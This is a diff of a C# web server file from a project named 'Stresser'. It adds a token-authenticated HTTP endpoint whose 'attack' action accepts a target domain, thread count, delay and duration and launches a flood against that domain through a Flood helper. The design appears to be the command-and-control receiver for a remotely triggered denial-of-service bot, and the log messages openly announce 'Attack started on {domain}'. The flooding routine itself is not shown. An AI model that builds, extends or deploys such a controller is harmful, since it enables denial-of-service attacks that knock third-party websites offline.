@@ -1,122 +1,158 @@
-
 using System.Net;
 using System.Text;
 using Microsoft.AspNetCore.Builder;
 using Microsoft.AspNetCore.Hosting;
 using Microsoft.AspNetCore.Http;
+using Microsoft.Extensions.Primitives;
 using Newtonsoft.Json;
 using Stresser.Helpers.ConfigHelper;
-
+using Stresser.Helpers.Flood;
+using Stresser.Helpers.HLogger;
 
 namespace Stresser.Services.WebServerService
 {
-
     class WebServerService
     {
-
         public void Start(string d_port, string d_host)
         {
             var host = new WebHostBuilder()
                 .UseKestrel(options =>
                 {
                     int port = int.Parse(d_port);
-                    options.Listen(IPAddress.Parse(d_host), port);
+                    IPAddress hostIp;
+                    if (IPAddress.TryParse(d_host, out hostIp))
+                    {
+                        options.Listen(hostIp, port);
+                    }
+                    else
+                    {
+                        options.ListenAnyIP(port);
+                    }
                 })
                 .Configure(ConfigureApp)
                 .Build();
 
             host.Run();
         }
-        private static (bool isValid, string message) IsAllowed(HttpRequest request)
-        {
-            string key = request.Headers["Authorization"];
-            if (string.IsNullOrEmpty(key))
-            {
-                return (false, "The token is invalid!");
-            }
 
-            if (key == ConfigHelper.GetSetting("webserver", "token"))
+        private static async Task ProcessRequest(HttpContext context)
+        {
+            var request = context.Request;
+            var response = context.Response;
+
+            if (request.Method == HttpMethods.Post && request.HasFormContentType)
             {
-                return (true, "Authorized.");
+                var form = await request.ReadFormAsync();
+                StringValues action;
+                if (form.TryGetValue("action", out action))
+                {
+                    switch (action)
+                    {
+                        case "status":
+                            await ExecuteStatusAction(response);
+                            break;
+                        case "attack":
+                            Program.hLogger.Log(LogType.Info, $"Got a request for an attack!");
+                            if (form.TryGetValue("domain", out var domain) &&
+                           form.TryGetValue("threads", out var threads) &&
+                           form.TryGetValue("rspt", out var rspt) &&
+                           form.TryGetValue("token", out var token) &&
+                           form.TryGetValue("time", out var time))
+                            {
+                                if (token == ConfigHelper.GetSetting("webserver", "token"))
+                                {
+                                    Program.hLogger.Log(LogType.Info, $"Attack started on {domain} for {time}s !");
+                                    ExecuteAttackAction(response, domain, threads, rspt, time);
+                                    await WriteErrorResponse(response, HttpStatusCode.OK, "OK");
+                                }
+                                else
+                                {
+                                    Program.hLogger.Log(LogType.Warning, $"Some one tried to start an attack for {domain} but he provided a wrong token!");
+                                    await WriteErrorResponse(response, HttpStatusCode.Forbidden, "Token is wrong bozo!.");
+                                    break;
+                                }
+                            }
+                            else
+                            {
+                                Program.hLogger.Log(LogType.Warning, $"Missing parameters for an attack!");
+                                await WriteErrorResponse(response, HttpStatusCode.BadRequest, "Missing parameters for 'attack' action.");
+                            }
+                            break;
+                        case "connect":
+                            if (form.TryGetValue("token", out var authtoken))
+                            {
+                                if (authtoken == ConfigHelper.GetSetting("webserver", "token"))
+                                {
+                                    await WriteErrorResponse(response, HttpStatusCode.OK, "OK");
+                                }
+                                else
+                                {
+                                    await WriteErrorResponse(response, HttpStatusCode.Forbidden, "Token is wrong bozo!.");
+                                }
+                            }
+                            else
+                            {
+                                await WriteErrorResponse(response, HttpStatusCode.BadRequest, "Missing parameters for 'connect' action.");
+                            }
+                            break;
+                        default:
+                            await WriteErrorResponse(response, HttpStatusCode.BadRequest, "Invalid action specified.");
+                            break;
+                    }
+                }
+                else
+                {
+                    await WriteErrorResponse(response, HttpStatusCode.BadRequest, "Action not specified.");
+                }
             }
-            return (false, "Key is invalid!");
+            else
+            {
+                await WriteErrorResponse(response, HttpStatusCode.MethodNotAllowed, "Unsupported method or content type.");
+            }
+        }
+
+        private static async Task ExecuteStatusAction(HttpResponse response)
+        {
+            var statusResponse = new
+            {
+                status = "OK"
+            };
+            await WriteJsonResponse(response, HttpStatusCode.OK, statusResponse);
+        }
+
+        private static async Task ExecuteAttackAction(HttpResponse response, string domain, string threads, string delay, string time)
+        {
+            var attackResponse = new
+            {
+                message = $"OK"
+            };
+            await Flood.Start(domain, int.Parse(threads), int.Parse(delay), int.Parse(time));
+            await WriteJsonResponse(response, HttpStatusCode.OK, attackResponse);
+        }
+
+        private static async Task WriteJsonResponse(HttpResponse response, HttpStatusCode statusCode, object responseObject)
+        {
+            var jsonResponse = JsonConvert.SerializeObject(responseObject);
+            var buffer = Encoding.UTF8.GetBytes(jsonResponse);
+            response.StatusCode = (int)statusCode;
+            response.ContentType = "application/json";
+            response.ContentLength = buffer.Length;
+            await response.Body.WriteAsync(buffer, 0, buffer.Length);
+        }
+
+        private static async Task WriteErrorResponse(HttpResponse response, HttpStatusCode statusCode, string errorMessage)
+        {
+            var errorResponse = new
+            {
+                message = errorMessage,
+                error = statusCode.ToString()
+            };
+            await WriteJsonResponse(response, statusCode, errorResponse);
         }
 
         private static void ConfigureApp(IApplicationBuilder app)
         {
             app.Run(ProcessRequest);
         }
-        private static async Task ProcessRequest(HttpContext context)
-        {
-            var request = context.Request;
-            var response = context.Response;
-
-            var absolutePath = request.Path.Value.TrimStart('/');
-            var (isValidKey, KeyMessage) = IsAllowed(request);
-            if (isValidKey)
-            {
-                switch (absolutePath)
-                {
-                    case "":
-                        {
-                            var errorResponse = new
-                            {
-                                message = "Bad Request",
-                                error = "Please provide a valid API endpoint."
-                            };
-                            var errorJson = JsonConvert.SerializeObject(errorResponse);
-                            var errorBuffer = Encoding.UTF8.GetBytes(errorJson);
-                            response.StatusCode = (int)HttpStatusCode.BadRequest;
-                            response.ContentType = "application/json";
-                            response.ContentLength = errorBuffer.Length;
-                            await response.Body.WriteAsync(errorBuffer, 0, errorBuffer.Length);
-                            break;
-                        }
-                    case "test":
-                        {
-                            var presponse = new
-                            {
-                                message = "Example Request",
-                                error = "This is an example request"
-                            };
-                            var pjson = JsonConvert.SerializeObject(presponse);
-                            var pBuffer = Encoding.UTF8.GetBytes(pjson);
-                            response.StatusCode = (int)HttpStatusCode.OK;
-                            response.ContentType = "application/json";
-                            response.ContentLength = pBuffer.Length;
-                            await response.Body.WriteAsync(pBuffer, 0, pBuffer.Length);
-                            break;
-                        }
-                    default:
-                        {
-                            var errorResponse = new
-                            {
-                                message = "Page not found",
-                                error = "The requested page does not exist."
-                            };
-                            var errorJson = JsonConvert.SerializeObject(errorResponse);
-                            var errorBuffer = Encoding.UTF8.GetBytes(errorJson);
-                            response.StatusCode = (int)HttpStatusCode.NotFound;
-                            response.ContentType = "application/json";
-                            response.ContentLength = errorBuffer.Length;
-                            await response.Body.WriteAsync(errorBuffer, 0, errorBuffer.Length);
-                            break;
-                        }
-                }
-            } else {
-                var errorResponse = new
-                {
-                    message = KeyMessage,
-                    error = "Invalid API key."
-                };
-                var errorJson = JsonConvert.SerializeObject(errorResponse);
-                var errorBuffer = Encoding.UTF8.GetBytes(errorJson);
-                response.StatusCode = (int)HttpStatusCode.Forbidden;
-                response.ContentType = "application/json";
-                response.ContentLength = errorBuffer.Length;
-                await response.Body.WriteAsync(errorBuffer, 0, errorBuffer.Length);
-            }
-        }
     }
-
 }
